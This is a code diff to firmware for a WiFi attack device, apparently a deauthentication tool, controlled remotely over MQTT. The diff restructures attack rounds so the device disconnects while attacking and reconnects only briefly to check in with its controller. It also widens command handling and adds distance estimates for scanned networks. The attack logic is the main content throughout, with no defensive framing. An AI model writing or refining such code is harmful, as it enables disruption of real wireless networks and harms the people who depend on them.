@@ -17,7 +17,10 @@ bool RemoteControl::attackModeActive = false;
 bool RemoteControl::attackPaused = false;
 unsigned long RemoteControl::lastStatusTime = 0;
 unsigned long RemoteControl::lastCheckTime = 0;
-unsigned long RemoteControl::checkInterval = 30000; // 30 seconds default
+unsigned long RemoteControl::checkInterval = 30000; // 30 seconds attack
+// unsigned long RemoteControl::checkInterval = 120000; // 2 minutes attack
+unsigned long RemoteControl::checkInDuration = 30000; // 30 seconds check-in
+unsigned long RemoteControl::attackRoundStart = 0;
 uint16_t RemoteControl::lastReason = 5;
 uint16_t RemoteControl::savedReason = 5;
 std::vector<AttackTarget> RemoteControl::attackTargets;
@@ -83,9 +86,29 @@ void RemoteControl::begin() {
 }
 
 void RemoteControl::loop() {
-  // Run attack loop if active
-  if (attackModeActive && !attackPaused) {
-    runAttackLoop();
+  unsigned long currentTime = millis();
+  
+  // Handle attack mode
+  if (attackModeActive) {
+    if (!attackPaused) {
+      // Check if attack round is complete (2 minutes)
+      if (currentTime - attackRoundStart >= checkInterval) {
+        Serial.println("\n⏸️ Attack round complete, checking in...");
+        stopAttack();
+        attackPaused = true;
+        lastCheckTime = currentTime;
+        
+        // Reconnect to WiFi/MQTT for check-in
+        performMQTTCheckIn();
+      } else {
+        // Continue attacking
+        runAttackLoop();
+      }
+    } else {
+      // Paused mode - stay connected to MQTT
+      handlePausedMode();
+    }
+    return;
   }
   
   // Reset triggered flag if attack is not active
@@ -94,21 +117,10 @@ void RemoteControl::loop() {
     attackPaused = false;
   }
   
-  unsigned long currentTime = millis();
-  
+  // Standby mode
   if (!attackModeActive && !attackTriggered) {
     handleStandbyMode(currentTime);
     return;
-  }
-  
-  if (attackPaused) {
-    handlePausedMode();
-    return;
-  }
-  
-  // Periodic MQTT check-in during attack
-  if (attackModeActive && currentTime - lastCheckTime >= checkInterval) {
-    performMQTTCheckIn();
   }
 }
 
@@ -135,7 +147,7 @@ bool RemoteControl::connectMQTT() {
   
   // Clear retained command immediately
   mqtt.publish(TOPIC_CMD_RETAINED, "", true);
-  mqtt.loop(); // Process the clear message
+  mqtt.loop();
   
   publishStatus("online");
   return true;
@@ -160,13 +172,19 @@ void RemoteControl::handlePausedMode() {
   }
   mqtt.loop();
   
-  // Resume attack if still triggered
-  if (attackTriggered && attackModeActive) {
-    delay(2000);
-    mqtt.loop();
-    Serial.println("▶️ Resuming attack...");
+  // Check if check-in duration has elapsed (30 seconds)
+  unsigned long currentTime = millis();
+  if (currentTime - lastCheckTime >= checkInDuration) {
+    Serial.println("▶️ Check-in complete, resuming attack...");
+    
+    // Disconnect MQTT and WiFi
+    mqtt.disconnect();
+    WiFi.disconnect();
+    delay(100);
+    
+    // Resume attack
     attackPaused = false;
-    publishStatus("resuming_attack");
+    attackRoundStart = millis();
     
     // Execute the attack
     executeAttack(savedAttackTargets, savedReason);
@@ -175,14 +193,6 @@ void RemoteControl::handlePausedMode() {
 
 void RemoteControl::performMQTTCheckIn() {
   Serial.println("\n⏰ MQTT Check-in...");
-  
-  // Save current attack state
-  savedAttackTargets = attackTargets;
-  savedReason = lastReason;
-  
-  // Pause attack
-  stopAttack();
-  attackPaused = true;
   
   // Reconnect WiFi for MQTT
   WiFi.begin(WIFI_SSID, WIFI_PASS);
@@ -202,6 +212,7 @@ void RemoteControl::performMQTTCheckIn() {
       doc["uptime"] = millis() / 1000;
       doc["rssi"] = WiFi.RSSI();
       doc["ip"] = localIpString();
+      doc["attack_duration"] = (millis() - attackRoundStart) / 1000;
       
       if (attackModeActive && savedAttackTargets.size() > 0) {
         doc["target_count"] = savedAttackTargets.size();
@@ -225,56 +236,15 @@ void RemoteControl::performMQTTCheckIn() {
       
       // Listen for commands during check-in
       unsigned long start = millis();
-      while (millis() - start < 5000) {
+      while (millis() - start < checkInDuration) {
         mqtt.loop();
         if (!attackModeActive) break;
         delay(10);
       }
       
-      // Send resuming status
-      if (attackModeActive && savedAttackTargets.size() > 0) {
-        JsonDocument resDoc;
-        resDoc["device"] = DEVICE_ID;
-        resDoc["status"] = "resuming_attack";
-        resDoc["mode"] = "multi_target";
-        resDoc["target_count"] = savedAttackTargets.size();
-        resDoc["uptime"] = millis() / 1000;
-        resDoc["rssi"] = WiFi.RSSI();
-        
-        JsonArray resTargets = resDoc["targets"].to<JsonArray>();
-        for (const auto& t : savedAttackTargets) {
-          JsonObject obj = resTargets.add<JsonObject>();
-          obj["ssid"] = sanitizeSsid(t.ssid);
-          char bssidStr[18];
-          sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X",
-                  t.bssid[0], t.bssid[1], t.bssid[2],
-                  t.bssid[3], t.bssid[4], t.bssid[5]);
-          obj["bssid"] = bssidStr;
-          obj["channel"] = t.channel;
-        }
-        
-        String resJson;
-        serializeJson(resDoc, resJson);
-        mqtt.publish(TOPIC_STATUS, resJson.c_str());
-        
-        // Flush before disconnect
-        for (int i = 0; i < 10; i++) {
-          mqtt.loop();
-          delay(50);
-        }
-        
-        mqtt.disconnect();
-        WiFi.disconnect();
-        delay(100);
-      } else {
-        publishStatus("standby");
-        Serial.println("ℹ️  No longer attacking, staying online");
-      }
+      lastCheckTime = millis();
     }
   }
-  
-  lastCheckTime = millis();
-  attackPaused = false;
 }
 
 void RemoteControl::runAttackLoop() {
@@ -282,6 +252,9 @@ void RemoteControl::runAttackLoop() {
   
   // Execute attack on targets
   executeAttack(attackTargets, lastReason);
+  
+  // Small delay between attack rounds
+  delay(1000);
 }
 
 void RemoteControl::executeAttack(const std::vector<AttackTarget>& targets, uint16_t reason) {
@@ -366,11 +339,12 @@ void RemoteControl::handleCommand(char* topic, byte* payload, unsigned int lengt
     attackTriggered = false;
     attackPaused = false;
     attackTargets.clear();
+    savedAttackTargets.clear();
     publishStatus("attack_stopped");
     publishStatus("standby");
   } else if (command.startsWith("set_interval:")) {
     unsigned long interval = command.substring(13).toInt();
-    if (interval >= 10000 && interval <= 3600000) {
+    if (interval >= 30000 && interval <= 600000) {
       checkInterval = interval;
       JsonDocument doc;
       doc["device"] = DEVICE_ID;
@@ -407,11 +381,19 @@ void RemoteControl::handleCommand(char* topic, byte* payload, unsigned int lengt
       
       if (!attackTargets.empty()) {
         lastReason = 5;
+        savedAttackTargets = attackTargets;
+        savedReason = lastReason;
         attackModeActive = true;
         attackTriggered = true;
         attackPaused = false;
+        attackRoundStart = millis();
         
         publishStatus("attack_starting");
+        
+        // Disconnect MQTT and start attack
+        mqtt.disconnect();
+        WiFi.disconnect();
+        delay(100);
         
         // Start attack
         executeAttack(attackTargets, lastReason);
@@ -444,6 +426,14 @@ String RemoteControl::localIpString() {
   char value[16];
   snprintf(value, sizeof(value), "%u.%u.%u.%u", ip[0], ip[1], ip[2], ip[3]);
   return String(value);
+}
+
+float RemoteControl::estimateDistance(short rssi) {
+  // Free Space Path Loss (FSPL) formula
+  // d = 10^((TxPower - RSSI) / (10 * n))
+  constexpr float measuredPower = -40.0f;  // RSSI at 1 meter (calibrated)
+  constexpr float pathLossExponent = 2.0f; // Free space path loss exponent
+  return powf(10.0f, (measuredPower - rssi) / (10.0f * pathLossExponent));
 }
 
 void RemoteControl::publishStatus(const char* status) {
@@ -533,6 +523,7 @@ void RemoteControl::publishScanResults() {
     obj["bssid"] = net.bssid;
     obj["channel"] = net.channel;
     obj["rssi"] = net.rssi;
+    obj["distance"] = roundf(estimateDistance(net.rssi) * 10.0f) / 10.0f;
     obj["is_target"] = net.isTarget;
     obj["band"] = net.channel <= 14 ? "2.4GHz" : "5GHz";
   }
